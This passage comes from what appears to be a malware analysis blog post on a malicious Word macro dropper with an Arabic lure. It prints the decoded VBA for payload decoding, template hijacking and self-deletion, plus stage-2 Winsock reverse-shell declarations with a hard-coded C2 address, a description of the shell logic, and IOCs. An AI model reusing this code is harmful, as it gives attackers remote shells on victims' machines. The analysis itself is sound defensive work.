+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>    i = Replace(i, &quot;j&quot;, &quot;9&quot;)
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>    For Counter = 1 To Len(i) Step 3
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>        o = o &amp; Chr(Mid(i, Counter, 3))
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>    Next
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>    Putin = o
+</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>End Function
+</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>Private Sub SubstitutePage()
+</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>    Dim doc As Word.Document
+</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>    Dim firstPageRange As Range
+</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>    Dim rng As Range
+</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>    Dim autoTextTemplateName As String
+</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>    ActiveDocument.ActiveWindow.View.DisplayBackgrounds = True
+</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>    ActiveDocument.Background.Fill.ForeColor.RGB = RGB(255, 255, 255)
+</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a>    ActiveDocument.Background.Fill.Solid
+</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a>    autoTextTemplateName = &quot;Doc&quot;
+</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a>    Set firstPageRange = Word.ActiveDocument.Range
+</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a>    firstPageRange.Select
+</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a>    Selection.WholeStory
+</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a>    Selection.Delete Unit:=wdCharacter, Count:=1
+</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a>    Set doc = ActiveDocument
+</span><span id="__span-0-72"><a id="__codelineno-0-72" name="__codelineno-0-72" href="#__codelineno-0-72"></a>    Set rng = doc.Sections(1).Range
+</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73" href="#__codelineno-0-73"></a>    doc.AttachedTemplate.AutoTextEntries(autoTextTemplateName).Insert rng, True
+</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74" href="#__codelineno-0-74"></a>    doc.Save
+</span><span id="__span-0-75"><a id="__codelineno-0-75" name="__codelineno-0-75" href="#__codelineno-0-75"></a>End Sub
+</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76" href="#__codelineno-0-76"></a>Sub unlink()
+</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77" href="#__codelineno-0-77"></a>    Application.DisplayAlerts = False
+</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78" href="#__codelineno-0-78"></a>    On Error GoTo Destroy
+</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79" href="#__codelineno-0-79"></a>    ThisDocument.AttachedTemplate.Saved = True
+</span><span id="__span-0-80"><a id="__codelineno-0-80" name="__codelineno-0-80" href="#__codelineno-0-80"></a>    CurrUser = Application.UserName
+</span><span id="__span-0-81"><a id="__codelineno-0-81" name="__codelineno-0-81" href="#__codelineno-0-81"></a>    tmpLoc = &quot;C:\Users&quot; &amp; CurrUser &amp; &quot;\AppData\Roaming\Microsoft\Templates\Normal.dotm&quot;
+</span><span id="__span-0-82"><a id="__codelineno-0-82" name="__codelineno-0-82" href="#__codelineno-0-82"></a>    ActiveDocument.AttachedTemplate = tmpLoc
+</span><span id="__span-0-83"><a id="__codelineno-0-83" name="__codelineno-0-83" href="#__codelineno-0-83"></a>    ActiveDocument.AttachedTemplate.Saved = True
+</span><span id="__span-0-84"><a id="__codelineno-0-84" name="__codelineno-0-84" href="#__codelineno-0-84"></a>    ActiveDocument.Save
+</span><span id="__span-0-85"><a id="__codelineno-0-85" name="__codelineno-0-85" href="#__codelineno-0-85"></a>    ThisDocument.Close savechanges:=False
+</span><span id="__span-0-86"><a id="__codelineno-0-86" name="__codelineno-0-86" href="#__codelineno-0-86"></a>Exit Sub
+</span><span id="__span-0-87"><a id="__codelineno-0-87" name="__codelineno-0-87" href="#__codelineno-0-87"></a>Destroy:
+</span><span id="__span-0-88"><a id="__codelineno-0-88" name="__codelineno-0-88" href="#__codelineno-0-88"></a>    Call ThisDocument.DeleteVBAPROJECT
+</span><span id="__span-0-89"><a id="__codelineno-0-89" name="__codelineno-0-89" href="#__codelineno-0-89"></a>    ActiveDocument.Save
+</span><span id="__span-0-90"><a id="__codelineno-0-90" name="__codelineno-0-90" href="#__codelineno-0-90"></a>    ActiveDocument.AttachedTemplate.Saved = True
+</span><span id="__span-0-91"><a id="__codelineno-0-91" name="__codelineno-0-91" href="#__codelineno-0-91"></a>    ThisDocument.Close savechanges:=False
+</span><span id="__span-0-92"><a id="__codelineno-0-92" name="__codelineno-0-92" href="#__codelineno-0-92"></a>End Sub
+</span><span id="__span-0-93"><a id="__codelineno-0-93" name="__codelineno-0-93" href="#__codelineno-0-93"></a>Sub DeleteVBAPROJECT()
+</span><span id="__span-0-94"><a id="__codelineno-0-94" name="__codelineno-0-94" href="#__codelineno-0-94"></a>    Application.DisplayAlerts = False
+</span><span id="__span-0-95"><a id="__codelineno-0-95" name="__codelineno-0-95" href="#__codelineno-0-95"></a>    Dim i As Long
+</span><span id="__span-0-96"><a id="__codelineno-0-96" name="__codelineno-0-96" href="#__codelineno-0-96"></a>    On Error Resume Next
+</span><span id="__span-0-97"><a id="__codelineno-0-97" name="__codelineno-0-97" href="#__codelineno-0-97"></a>    With ThisDocument.VBProject
+</span><span id="__span-0-98"><a id="__codelineno-0-98" name="__codelineno-0-98" href="#__codelineno-0-98"></a>        For i = .VBComponents.Count To 1 Step -1
+</span><span id="__span-0-99"><a id="__codelineno-0-99" name="__codelineno-0-99" href="#__codelineno-0-99"></a>            .VBComponents.Remove .VBComponents(i)
+</span><span id="__span-0-100"><a id="__codelineno-0-100" name="__codelineno-0-100" href="#__codelineno-0-100"></a>            .VBComponents(i).CodeModule.DeleteLines _
+</span><span id="__span-0-101"><a id="__codelineno-0-101" name="__codelineno-0-101" href="#__codelineno-0-101"></a>            1, .VBComponents(i).CodeModule.CountOfLines
+</span><span id="__span-0-102"><a id="__codelineno-0-102" name="__codelineno-0-102" href="#__codelineno-0-102"></a>        Next i
+</span><span id="__span-0-103"><a id="__codelineno-0-103" name="__codelineno-0-103" href="#__codelineno-0-103"></a>    End With
+</span><span id="__span-0-104"><a id="__codelineno-0-104" name="__codelineno-0-104" href="#__codelineno-0-104"></a>    On Error GoTo 0
+</span><span id="__span-0-105"><a id="__codelineno-0-105" name="__codelineno-0-105" href="#__codelineno-0-105"></a>    ActiveDocument.Save
+</span><span id="__span-0-106"><a id="__codelineno-0-106" name="__codelineno-0-106" href="#__codelineno-0-106"></a>End Sub
+</span></code></pre></div>
+<p>Exhibit 6: Decompressed source of the <code>ThisDocument</code> module</p>
+<h2 id="userform-payload-extraction-and-decoding">UserForm Payload Extraction and Decoding<a class="headerlink" href="#userform-payload-extraction-and-decoding" title="Permanent link">&para;</a></h2>
+<p>The stage-2 substrate lives in the <code>UserForm1/o</code> OLE stream of <code>word/vbaProject.bin</code>, 16,448 bytes long. This stream is not opaque binary - it is two concatenated MS-OFORMS TextProps records, each carrying one of the UserForm's variable-length property values. Walking the stream as <code>(2-byte Version | 2-byte cbTextProps | Body)</code> produces a clean partition: a 16,420-byte record at offset <code>0x0000</code> carrying the TextBox's <code>Text</code> property (the encoded payload), followed immediately by a 28-byte record at offset <code>0x4024</code> carrying the TextBox's <code>FontName</code> property (the string <code>Tahoma</code>). Total consumed: <code>16,420 + 28 = 16,448</code> bytes, the entire stream. The payload itself (a single contiguous block of <code>[a-j]</code> characters, 16,392 bytes long) sits inside the larger record's ExtraDataBlock, beginning at stream offset <code>0x001C</code> and ending at <code>0x4024</code> immediately before the second record's header.</p>
+<p><img alt="Pasted image 20260511140713.png" src="../images/Pasted%20image%2020260511140713.png" /> Exhibit 7: <code>xxd -l 64 /tmp/UserForm1_o.bin</code> and <code>xxd -s -64 /tmp/UserForm1_o.bin</code> side-by-side, showing the OFORMS header <code>00 02 20 40 …</code> at offset <code>0x00</code> resolving into the <code>[a-j]</code> payload at <code>0x1C</code>, and the trailing TextProps record <code>00 02 18 00 …</code> at <code>0x4024</code> containing the <code>Tahoma</code> font value.</p>
+<p>Decoding the payload statically reproduces what <code>Putin</code> would output at runtime. The longest <code>[a-j]</code> run is exactly 16,392 characters, divisible by 3, yielding 5,464 triplets with no out-of-range values. The first three triplets decode to <code>067 111 110</code> (<code>C</code>, <code>o</code>, <code>n</code>) and the last three to <code>083 117 098</code> (<code>S</code>, <code>u</code>, <code>b</code>); the recovered file therefore begins with <code>Const ip = "51.38.87.253"</code> and ends with <code>End Sub</code>, exactly the start and end of a complete VBA module. The decoded module is 5,464 bytes; its SHA-256 is <code>317f6f93fe81d1800cbbb1d8f8dbb7c7b27412358f3058f58a2496bae20f0863</code>.</p>
+<p><img alt="Pasted image 20260511143144.png" src="../images/Pasted%20image%2020260511143144.png" />Exhibit 8: Python decode harness output showing <code>encoded len: 16392</code>, <code>decoded len: 5464</code>, the SHA-256, first line <code>Const ip = "51.38.87.253"</code>, and last line <code>End Sub</code>.</p>
+<h2 id="stage-2-reverse-shell-analysis">Stage-2 Reverse-Shell Analysis<a class="headerlink" href="#stage-2-reverse-shell-analysis" title="Permanent link">&para;</a></h2>
+<p>The decoded VBA module is 145 lines of Winsock reverse-shell code. It declares four Win32 structures (<code>WSADATA</code>, <code>ADDRINFO</code>, <code>STARTUPINFOA</code>, <code>PROCESS_INFORMATION</code>), two enums for address families and socket types, and ten <code>Private Declare PtrSafe</code> API imports from <code>ws2_32.dll</code> (<code>WSAStartup</code>, <code>WSACleanup</code>, <code>WSAGetLastError</code>, <code>WSASocketA</code>, <code>connect</code>, <code>closesocket</code>, <code>GetAddrInfo</code>) and <code>kernel32.dll</code> (<code>CopyMemory</code>, <code>ZeroMemory</code>, and <code>CreateProc</code> aliased to <code>CreateProcessA</code>). The C2 endpoint is hard-coded as VBA string constants at the top of the module: <code>ip = "51.38.87.253"</code> and <code>port = "25255"</code>.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Const ip = &quot;51.38.87.253&quot;
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Const port = &quot;25255&quot;
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Const INVALID_SOCKET = -1
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Const WSADESCRIPTION_LEN = 256
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Const SOCKET_ERROR = -1
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Private Type WSADATA
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    wVersion As Integer
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    wHighVersion As Integer
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>    szDescription(0 To WSADESCRIPTION_LEN) As Byte
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>    szSystemStatus(0 To WSADESCRIPTION_LEN) As Byte
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>    iMaxSockets As Integer
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>    iMaxUdpDg As Integer
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>    lpVendorInfo As Long
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>End Type
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>Private Type ADDRINFO
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>    ai_flags As Long
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>    ai_family As Long
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>    ai_socktype As Long
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>    ai_protocol As Long
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>    ai_addrlen As Long
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>    ai_canonName As LongPtr
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>    ai_addr As LongPtr
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>    ai_next As LongPtr
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>End Type
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>Private Type STARTUPINFOA
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>    cb As Long
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>    lpReserved As String
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>    lpDesktop As String
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>    lpTitle As String
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>    dwX As Long
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>    dwY As Long
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>    dwXSize As Long
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>    dwYSize As Long
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>    dwXCountChars As Long
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>    dwYCountChars As Long
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>    dwFillAttribute As Long
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>    dwFlags As Long
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>    wShowWindow As Integer
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>    cbReserved2 As Integer
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>    lpReserved2 As String
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>    hStdInput As LongPtr
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>    hStdOutput As LongPtr
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>    hStdError As LongPtr
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>End Type
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>Private Type PROCESS_INFORMATION
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>    hProcess As LongPtr
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>    hThread As LongPtr
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>    dwProcessId As Long
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>    dwThreadId As Long
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>End Type
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>Enum af
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>    AF_UNSPEC = 0
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>    AF_INET = 2
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>    AF_IPX = 6
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>    AF_APPLETALK = 16
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>    AF_NETBIOS = 17
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>    AF_INET6 = 23
+</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>    AF_IRDA = 26
+</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>    AF_BTH = 32
+</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>End Enum
+</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>Enum sock_type
+</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a>    SOCK_STREAM = 1
+</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a>    SOCK_DGRAM = 2
+</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a>    SOCK_RAW = 3
+</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>    SOCK_RDM = 4
+</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a>    SOCK_SEQPACKET = 5
+</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>End Enum
+</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a>Private Declare PtrSafe Function WSAStartup Lib &quot;ws2_32.dll&quot; (ByVal wVersionRequested As Integer, ByRef data As WSADATA) As Long
+</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a>Private Declare PtrSafe Function connect Lib &quot;ws2_32.dll&quot; (ByVal socket As LongPtr, ByVal SOCKADDR As LongPtr, ByVal namelen As Long) As Long
+</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a>Private Declare PtrSafe Sub WSACleanup Lib &quot;ws2_32.dll&quot; ()
+</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>Private Declare PtrSafe Function GetAddrInfo Lib &quot;ws2_32.dll&quot; Alias &quot;getaddrinfo&quot; (ByVal NodeName As String, ByVal ServName As String, ByVal lpHints As LongPtr, lpResult As LongPtr) As Long
+</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a>Private Declare PtrSafe Function closesocket Lib &quot;ws2_32.dll&quot; (ByVal socket As LongPtr) As Long
+</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>Private Declare PtrSafe Sub CopyMemory Lib &quot;kernel32&quot; Alias &quot;RtlMoveMemory&quot; (Destination As Any, Source As Any, ByVal Length As Long)
+</span><span id="__span-1-74"><a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a>Private Declare PtrSafe Function WSAGetLastError Lib &quot;ws2_32.dll&quot; () As Long
+</span><span id="__span-1-75"><a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a>Private Declare PtrSafe Function CreateProc Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
+</span><span id="__span-1-76"><a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a>Private Declare PtrSafe Sub ZeroMemory Lib &quot;kernel32&quot; Alias &quot;RtlZeroMemory&quot; (Destination As STARTUPINFOA, ByVal Length As Long)
+</span><span id="__span-1-77"><a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>Private Declare PtrSafe Function WSASocketA Lib &quot;ws2_32.dll&quot; (ByVal af As Long, ByVal t As Long, ByVal protocol As Long, lpProtocolInfo As Any, ByVal g As Long, ByVal dwFlags As Long) As Long
+</span></code></pre></div>
+Exhibit 9: Stage-2 Winsock Reverse-shell Code</p>
+<p>The <code>revShell()</code> function is the canonical Winsock-spawn-cmd reverse-shell pattern. It calls <code>WSAStartup(MAKEWORD(2,2), ...)</code> to initialise Winsock 2.2, resolves the C2 via <code>GetAddrInfo</code> with <code>ai_family = AF_UNSPEC</code> and <code>ai_socktype = SOCK_STREAM</code>, and walks the returned <code>addrinfo</code> linked list calling <code>WSASocketA</code> and <code>connect</code> for each node until one succeeds. Once connected, it zero-initialises a <code>STARTUPINFOA</code>, sets <code>dwFlags = &amp;H100</code> (<code>STARTF_USESTDHANDLES</code>), assigns the connected socket handle to <code>hStdInput</code>, <code>hStdOutput</code>, and <code>hStdError</code>, and calls <code>CreateProc(vbNullString, "cmd", ByVal 0&amp;, ByVal 0&amp;, True, &amp;H8000000, 0, vbNullString, si, pi)</code>. The combination of <code>bInheritHandles = TRUE</code> and <code>CREATE_NO_WINDOW</code> (<code>0x08000000</code>) binds <code>cmd.exe</code>'s standard handles to the connected socket while suppressing the console window. This is a textbook Windows reverse-shell construction.</p>
+<h2 id="persistence">Persistence<a class="headerlink" href="#persistence" title="Permanent link">&para;</a></h2>
+<p>The dropper's intended mechanism is template-poisoning of <code>%APPDATA%\Microsoft\Templates\Normal.dotm</code> such that an injected <code>Document_Close()</code> would fire on every Word-document close. The chain does not achieve this. <code>Create_Word</code> injects the stage-2 VBA into the <code>VBProject</code> of a transient document, then immediately discards it:</p>
+<div class="language-vbscript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">Set</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Wordy</span><span class="p">.</span><span class="n">Documents</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="w">             </span><span class="c1">&#39; new transient document - its own VBProject</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">doc</span><span class="p">.</span><span class="n">VBProject</span><span class="p">.</span><span class="n">VBComponents</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">CodeModule</span><span class="p">.</span><span class="n">AddFromString</span><span class="w"> </span><span class="p">(</span><span class="n">Putin</span><span class="p">(</span><span class="n">content</span><span class="p">))</span><span class="w">   </span><span class="c1">&#39; code added to transient doc</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">doc</span><span class="p">.</span><span class="n">Close</span><span class="w">                                      </span><span class="c1">&#39; transient doc discarded (DisplayAlerts=0 suppresses save prompt)</span>
+</span></code></pre></div>
+<h2 id="infrastructure-and-attribution">Infrastructure and Attribution<a class="headerlink" href="#infrastructure-and-attribution" title="Permanent link">&para;</a></h2>
+<p>The sample itself was submitted to VirusTotal a single time, from Bangladesh, on 10-05-2026.</p>
+<p>The IP <code>51.38.87.253</code> has been associated with APT42 / Charming Kitten (Iranian-nexus, also tracked as TA453, Mint Sandstorm, Yellow Garuda) infrastructure, but I have not independently verified this association from the sample alone (https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations).</p>
+<p>The Arabic security-training-course lure theme is <em>compatible</em> with APT42 / Charming Kitten targeting (Iranian-nexus actors have a documented history of operations against Arabic-speaking security and military entities across the Gulf, Iraq, Lebanon, and Syria), but theme alone does not constitute attribution.</p>
+<p>NOTE: Weather this was an old sample uploaded just now by some researcher, or new potential APT42 campaign lure is beyond my current knowledge. In any case, it's was an interesting sample to analyse.</p>
+<h2 id="indicators-of-compromise">Indicators of Compromise<a class="headerlink" href="#indicators-of-compromise" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Hashes
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>------
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>SHA-256   e6cc542b690066cf6914e88199ce234236f2d929f313af8b0b2f8babe43d4f7d
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>SHA-1     403d9437edbc1a3f32aaa5a63eea633dea57ea0a
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>MD5       83b6030d3fa8f8efee3400440af230c6
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>ssdeep    768:DiehqsoMCWBJ9B23vxllNuLWlX9Ymzj+3BaVk7oXaFae:Di9soc5B0vB9t9YWSBaUoXaQe
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>Decoded stage-2 VBA module (recovered statically)
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>-------------------------------------------------
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>SHA-256   317f6f93fe81d1800cbbb1d8f8dbb7c7b27412358f3058f58a2496bae20f0863
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>Size      5,464 bytes
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>Storage on infected host : %APPDATA%\Microsoft\Templates\Normal.dotm  (inside the VBA project)
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>Network
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>-------
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>51.38.87.253           TCP/IPv4, OVH SAS / AS16276
